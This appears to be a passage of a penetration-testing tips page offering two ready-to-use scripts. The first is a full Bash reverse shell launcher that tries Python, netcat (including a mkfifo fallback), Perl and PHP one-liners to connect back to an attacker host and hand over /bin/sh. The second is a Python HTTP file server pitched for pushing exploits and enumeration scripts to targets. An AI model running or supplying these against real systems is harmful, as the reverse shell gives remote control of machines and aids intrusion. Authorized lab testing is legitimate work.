## 1. Robust Reverse Shell Launcher (Bash)

This script attempts several methods ( #Python3, #Python2, #Netcat—with a fallback if “-e” isn’t supported— #Perl, or #PHP) and selects the first available option. It lets you quickly pivot from limited code execution to an interactive shell.

```bash
#!/bin/bash
# robust_revshell.sh - A versatile reverse shell launcher
# Usage: ./robust_revshell.sh <LHOST> <LPORT>

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <LHOST> <LPORT>"
    exit 1
fi

LHOST=$1
LPORT=$2

echo "[*] Attempting to spawn a reverse shell to $LHOST:$LPORT"

# Function: Check if netcat supports the -e option.
nc_with_e() {
    nc -h 2>&1 | grep -q "\-e"
}

# Try Python 3
if command -v python3 >/dev/null 2>&1; then
    echo "[*] Using python3 reverse shell"
    python3 -c "import socket,os,pty; s=socket.socket(); s.connect(('$LHOST',$LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn('/bin/sh')"
# Try Python 2
elif command -v python >/dev/null 2>&1; then
    echo "[*] Using python reverse shell"
    python -c "import socket,os,pty; s=socket.socket(); s.connect(('$LHOST',$LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn('/bin/sh')"
# Try Netcat
elif command -v nc >/dev/null 2>&1; then
    if nc_with_e; then
        echo "[*] Using netcat with -e"
        nc -e /bin/sh $LHOST $LPORT
    else
        echo "[*] Using netcat fallback method"
        rm -f /tmp/f; mkfifo /tmp/f
        cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f
    fi
# Try Perl
elif command -v perl >/dev/null 2>&1; then
    echo "[*] Using perl reverse shell"
    perl -e "use Socket; \$i='$LHOST'; \$p=$LPORT; socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')); connect(S,sockaddr_in(\$p,inet_aton(\$i))); open(STDIN, '>&S'); open(STDOUT, '>&S'); open(STDERR, '>&S'); exec('/bin/sh -i');"
# Try PHP
elif command -v php >/dev/null 2>&1; then
    echo "[*] Using php reverse shell"
    php -r "\$sock=fsockopen('$LHOST',$LPORT); exec('/bin/sh -i <&3 >&3 2>&3');"
else
    echo "[-] No suitable reverse shell method found!"
    exit 1
fi

```

**Usage Tips:**

- Before use, test each method in your lab to see which interpreters/utilities are commonly available.
- The script automatically falls back through several options, so if one method fails, another may work—ideal when targets have restricted environments.

---

## 2. Robust HTTP File Server ( #Python)

This #Python3 script starts a simple multi-threaded #HTTP server with command-line options to specify the bind interface, port, and serving directory. This helps if the target’s allowed outbound connections are limited to specific ports or if you need to serve files from a particular folder.

```python
#!/usr/bin/env python3
"""
robust_http_server.py: A versatile HTTP file server for transferring files.

Usage: python3 robust_http_server.py [-i INTERFACE] [-p PORT] [-d DIRECTORY]

Options:
  -i, --interface  Interface to bind to (default: all interfaces)
  -p, --port       Port to listen on (default: 8000)
  -d, --directory  Directory to serve (default: current directory)
"""

import http.server
import socketserver
import argparse
import sys
import os

def main():
    parser = argparse.ArgumentParser(description="Robust HTTP File Server")
    parser.add_argument("-i", "--interface", default="", help="Interface to bind to (default: all interfaces)")
    parser.add_argument("-p", "--port", type=int, default=8000, help="Port to bind to (default: 8000)")
    parser.add_argument("-d", "--directory", default=".", help="Directory to serve (default: current directory)")
    args = parser.parse_args()

    try:
        # Change working directory to the specified directory.
        os.chdir(args.directory)
    except Exception as e:
        print(f"[-] Failed to change directory: {e}", file=sys.stderr)
        sys.exit(1)

    Handler = http.server.SimpleHTTPRequestHandler
    try:
        # Using ThreadingTCPServer for handling multiple connections.
        with socketserver.ThreadingTCPServer((args.interface, args.port), Handler) as httpd:
            bind_addr = args.interface if args.interface else "0.0.0.0"
            print(f"[*] Serving HTTP on {bind_addr} port {args.port} (http://{bind_addr}:{args.port}/) ...")
            httpd.serve_forever()
    except Exception as e:
        print(f"[-] Error: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()

```

**Usage Tips:**

- Adjust the port and interface based on the network configuration you’re targeting.
- You can serve any directory (for example, a folder containing your enumeration scripts or exploits) simply by changing the `-d` parameter.
- The threaded server handles multiple connections, which can be helpful if you’re rapidly transferring several files or need robust performance in tight scenarios.